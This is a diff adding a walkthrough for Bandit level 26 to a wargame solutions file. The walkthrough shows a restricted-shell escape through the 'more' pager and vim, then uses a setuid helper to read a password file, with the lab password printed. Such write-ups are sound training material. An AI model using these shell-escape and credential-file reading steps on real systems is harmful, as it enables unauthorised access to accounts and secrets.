@@ -861,3 +861,32 @@ connect to bandit25 using given password
 
 
 - Level 26
+
+Used the Vim editor exploit, it is when instead of /bin/bash shell, the host uses some custom shell. It runs showtext to show the bandit logo and immediately closes the connection, which is why the earlier trick of running commands through ssh wont work on this. Instead we can use the pager exploit where you shrink the command prompt window size to around 3-4 lines, so that the "more" pager shows each line one by one. When this happens, a line looking like "---More(50%)---" would appear, which is when you click the v key to open the logo in vim editor. Now when we are in vim, we can change the shell to the default /bin/bash shell, and launch the shell from there, to gain access to the shell finally, and then execute the binary in the working directory.
+
+Output:
+
+(when this logo appeared, i pressed v key and then typed :set shell=/bin/bash/)
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+:shell
+bandit26@bandit:~$ dir
+bandit27-do  text.txt
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do id
+uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+bandit26@bandit:~$ ./bandit27-do "cat /etc/bandit_pass/bandit27"
+env: ‘cat /etc/bandit_pass/bandit27’: No such file or directory
+env: use -[v]S to pass options in shebang lines
+bandit26@bandit:~$ ./bandit27-do -S "cat /etc/bandit_pass/bandit27"
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+bandit26@bandit:~$
+____________
+
+connect to bandit27 with given password
+
+
+- Level 27
